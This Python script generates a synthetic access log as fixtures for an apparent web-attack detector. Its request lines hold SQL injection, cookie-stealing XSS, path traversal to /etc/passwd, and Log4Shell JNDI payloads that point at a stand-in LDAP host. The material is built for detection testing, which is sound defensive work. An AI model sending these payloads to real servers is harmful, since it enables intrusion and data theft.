"""Generate samples/access.log, the synthetic web server log used by the tests and the demo.

Every client uses an RFC 5737 documentation address. The log mixes legitimate traffic
(including benign look-alikes such as ``?q=select+your+plan``) with the attacks LogSentinel
detects, so false positives show up in the tests as well as true positives.

Usage:
    python scripts/gen_access_log.py [output]     # default: samples/access.log
"""
from __future__ import annotations

import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

T0 = datetime(2026, 11, 22, 15, 0, 0, tzinfo=timezone.utc)
FIREFOX = "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0"
CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"
DEFAULT_OUTPUT = Path(__file__).resolve().parent.parent / "samples" / "access.log"


def build_rows() -> list[tuple[float, str]]:
    rows: list[tuple[float, str]] = []

    def add(sec: float, ip: str, req: str, status: int, size: int, ua: str, ref: str = "-") -> None:
        ts = (T0 + timedelta(seconds=sec)).strftime("%d/%b/%Y:%H:%M:%S %z")
        rows.append((sec, f'{ip} - - [{ts}] "{req}" {status} {size} "{ref}" "{ua}"'))

    # Legitimate traffic, including requests that look suspicious but are not.
    pages = [("/", 200, 5120), ("/css/main.css", 200, 2210), ("/js/app.js", 200, 8800), ("/favicon.ico", 404, 196),
             ("/blog/", 200, 7340), ("/blog/hardening-ssh", 200, 9120), ("/contact", 200, 3300)]
    for i, (path, status, size) in enumerate(pages):
        add(i * 7, "198.51.100.7", f"GET {path} HTTP/1.1", status, size, FIREFOX, "https://example.com/")
    lookalikes = [("/search?q=select+your+plan", 200), ("/docs/../img/logo.png", 200), ("/pricing", 200),
                  ("/old-page", 404), ("/api/orders?sort=date&order=desc", 200), ("/blog/union-station-or-airport", 404)]
    for i, (path, status) in enumerate(lookalikes):
        add(20 + i * 11, "198.51.100.20", f"GET {path} HTTP/1.1", status, 1500, CHROME)
    add(95, "198.51.100.20", "POST /login HTTP/1.1", 302, 0, CHROME)

    # gobuster with its default User-Agent: caught by the signature and by behaviour.
    words = ["admin", "backup", "config", "db", "dev", "wp-admin", "phpmyadmin", ".git/HEAD", ".env", "uploads",
             "api", "old", "test", "tmp", "server-status", ".htaccess", "cgi-bin/", "private", "secret", "logs",
             "install", "setup", "console", "manager/html", "portal", "staging", "include", "vendor"]
    for i, word in enumerate(words):
        status = 301 if word == "uploads" else 403 if word in (".htaccess", "server-status") else 200 if word == "api" else 404
        add(120 + i * 0.3, "203.0.113.50", f"GET /{word} HTTP/1.1", status, 196, "gobuster/3.6")

    # Slower wordlist scan behind a browser User-Agent: only the behavioural rule sees it.
    hidden = ["admin.php", "login.php", "backup.zip", "site.tar.gz", "db.sql", "dump.sql", "config.php.bak",
              "wp-config.php.bak", ".svn/entries", ".DS_Store", "web.config", "debug.log", "error.log",
              "info.php", "phpinfo.php", "test.php", "shell.php", "upload.php", "admin/login", "user/login",
              "administrator/", "panel/", "cpanel", "webmail"]
    for i, word in enumerate(hidden):
        add(200 + i * 2, "203.0.113.120", f"GET /{word} HTTP/1.1", 404, 196, CHROME)

    # sqlmap
    queries = ["id=1", "id=1%27", "id=1%20AND%201%3D1", "id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20-",
               "id=1%27%20AND%20SLEEP(5)--%20-",
               "id=1/**/UNION/**/SELECT/**/table_name/**/FROM/**/information_schema.tables"]
    for i, query in enumerate(queries):
        status = 500 if "%27" in query and "SLEEP" not in query else 200
        add(300 + i * 3, "203.0.113.77", f"GET /products.php?{query} HTTP/1.1", status, 900,
            "sqlmap/1.8.11#stable (https://sqlmap.org)")

    # Manual attacker with a normal browser User-Agent.
    add(400, "192.0.2.10", "GET /login.php?user=admin%27%20OR%20%271%27%3D%271&pass=x HTTP/1.1", 200, 1200, CHROME)
    add(410, "192.0.2.10", "GET /search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1", 200, 1800, CHROME)
    add(415, "192.0.2.10", "GET /search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E HTTP/1.1", 200, 1800, CHROME)
    add(420, "192.0.2.10", "GET /item?id=5%2527%2520OR%25201%253D1-- HTTP/1.1", 200, 1100, CHROME)  # double-encoded

    # Nikto
    nikto = [("/", 200), ("/index.php?page=../../../../etc/passwd", 200), ("/cgi-bin/test.cgi", 404),
             ("/download?file=..%2F..%2F..%2Fwindows%2Fwin.ini", 400)]
    for i, (path, status) in enumerate(nikto):
        add(500 + i, "192.0.2.99", f"GET {path} HTTP/1.1", status, 300,
            "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)")

    # Log4Shell: payload in the User-Agent, then an obfuscated one in the URL.
    add(550, "203.0.113.200", "GET / HTTP/1.1", 200, 5120, "${jndi:ldap://198.51.100.250:1389/Exploit}")
    add(552, "203.0.113.200", "GET /?q=%24%7B%24%7Blower:j%7Dndi:ldap://198.51.100.250:1389/b%7D HTTP/1.1", 200, 5120,
        CHROME)

    # Noise: a TLS handshake sent to the HTTP port (Nginx logs the bytes as \xNN text) and a non-log line.
    add(600, "198.51.100.99", r"\x16\x03\x01\x00\xa5\x01\x00\x00", 400, 157, "-")
    rows.append((601, "this line is not an access log entry"))
    return sorted(rows, key=lambda r: r[0])


def main(argv: list[str]) -> None:
    output = Path(argv[0]) if argv else DEFAULT_OUTPUT
    # UTF-8 and LF on every platform, so the file is identical on Windows and Linux.
    with output.open("w", encoding="utf-8", newline="\n") as fh:
        fh.write("\n".join(line for _, line in build_rows()) + "\n")


if __name__ == "__main__":
    main(sys.argv[1:])
